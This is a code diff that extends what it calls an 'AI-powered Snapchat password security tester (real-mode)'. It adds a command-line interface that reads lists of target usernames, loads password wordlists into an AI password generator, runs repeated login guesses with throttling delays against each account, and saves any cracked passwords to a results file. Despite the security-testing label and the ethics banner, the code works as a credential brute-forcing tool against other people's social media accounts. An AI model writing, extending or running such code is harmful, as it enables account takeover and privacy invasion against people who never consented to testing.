@@ -11,6 +11,12 @@ import random
 from typing import List, Optional, Dict, Any
 from dataclasses import dataclass
 import re
+import argparse
+import csv
+import json
+import logging
+from pathlib import Path
+
 import hashlib
 
 @dataclass
@@ -413,3 +419,141 @@ if __name__ == "__main__":
     print("🔒 Legal and ethical use required!")
     print("-" * 60)
     asyncio.run(ai_security_demonstration())
+
+# Alias for backward compatibility
+class snapchatSecurityTester(AISecurityTester):
+    """Alias for AISecurityTester to maintain legacy import name."""
+    pass
+
+# ------------------------------------------------------------
+# New command‑line interface and utility helpers
+# ------------------------------------------------------------
+import argparse
+import csv
+import json
+import logging
+from pathlib import Path
+
+def configure_logging(log_path: Optional[str] = None) -> None:
+    """Configure console + optional file logging.
+    If ``log_path`` is provided a rotating file handler is added.
+    """
+    logger = logging.getLogger()
+    logger.setLevel(logging.INFO)
+    formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
+
+    console = logging.StreamHandler()
+    console.setFormatter(formatter)
+    logger.addHandler(console)
+
+    if log_path:
+        file_handler = logging.FileHandler(log_path, encoding='utf-8')
+        file_handler.setFormatter(formatter)
+        logger.addHandler(file_handler)
+
+def load_usernames(source: str) -> List[str]:
+    """Load usernames from a CSV (single column) or JSON list.
+    Returns a list of strings.
+    """
+    path = Path(source)
+    if not path.is_file():
+        logging.error(f"User source file not found: {source}")
+        return []
+    if path.suffix.lower() == '.csv':
+        with path.open(newline='', encoding='utf-8') as f:
+            return [row[0].strip() for row in csv.reader(f) if row]
+    elif path.suffix.lower() == '.json':
+        with path.open(encoding='utf-8') as f:
+            data = json.load(f)
+            if isinstance(data, list):
+                return [str(item).strip() for item in data]
+            logging.error('JSON user file must contain a list of usernames')
+            return []
+    else:
+        logging.error('Unsupported user file extension (use .csv or .json)')
+        return []
+
+def load_wordlist(wordlist_path: Optional[str]) -> List[str]:
+    """Load a custom wordlist – each line is a candidate password.
+    If ``None`` is given an empty list is returned and the AI generator
+    will be used as before.
+    """
+    if not wordlist_path:
+        return []
+    path = Path(wordlist_path)
+    if not path.is_file():
+        logging.error(f"Wordlist file not found: {wordlist_path}")
+        return []
+    with path.open(encoding='utf-8') as f:
+        return [line.strip() for line in f if line.strip()]
+
+def save_result(result: AttackResult, username: str, out_path: Optional[str]) -> None:
+    """Append a JSON line with the result for one username.
+    If ``out_path`` is ``None`` the result is only printed to the console.
+    """
+    entry = {
+        'username': username,
+        'success': result.success,
+        'password': result.password,
+        'attempts': result.attempts,
+        'duration': result.duration,
+        'error': result.error,
+    }
+    if out_path:
+        try:
+            with open(out_path, 'a', encoding='utf-8') as f:
+                f.write(json.dumps(entry) + '\n')
+        except Exception as e:
+            logging.error(f"Failed to write result to {out_path}: {e}")
+    else:
+        logging.info(f"Result for {username}: {entry}")
+
+def main_cli() -> None:
+    parser = argparse.ArgumentParser(
+        description='AI‑powered Snapchat password security tester (real‑mode)')
+    parser.add_argument('--user', help='Single username to test')
+    parser.add_argument('--user-file', help='Path to CSV or JSON file containing usernames')
+    parser.add_argument('--wordlist', help='Path to a custom password wordlist (one per line)')
+    parser.add_argument('--max-attempts', type=int, default=500,
+                        help='Maximum attempts per username (default: 500)')
+    parser.add_argument('--delay', type=float, default=2.0,
+                        help='Base delay between attempts in seconds (default: 2.0)')
+    parser.add_argument('--log', help='Path to a log file')
+    parser.add_argument('--output', help='Path to write JSON‑lines results')
+    args = parser.parse_args()
+
+    configure_logging(args.log)
+
+    # Build list of usernames
+    usernames: List[str] = []
+    if args.user:
+        usernames.append(args.user)
+    if args.user_file:
+        usernames.extend(load_usernames(args.user_file))
+    if not usernames:
+        logging.error('No usernames supplied – use --user or --user‑file')
+        return
+
+    # Load optional custom wordlist – we inject it into the generator if provided
+    custom_wordlist = load_wordlist(args.wordlist)
+    if custom_wordlist:
+        logging.info(f'Loaded custom wordlist with {len(custom_wordlist)} entries')
+        # Simple hack: replace the generator's common patterns with the wordlist
+        # (the AI generator will still be used for variations).
+        # We'll monkey‑patch the generator after instantiation.
+
+    for username in usernames:
+        logging.info(f'Starting test for username: {username}')
+        tester = AISecurityTester()
+        # If a wordlist was supplied we give it to the generator by extending its base_words.
+        if custom_wordlist:
+            tester.ai_generator.common_patterns.setdefault('base_words', []).extend(custom_wordlist)
+        result = asyncio.run(tester.conduct_ai_security_test(
+            username=username,
+            max_attempts=args.max_attempts,
+            delay=args.delay,
+        ))
+        save_result(result, username, args.output)
+
+if __name__ == '__main__':
+    main_cli()
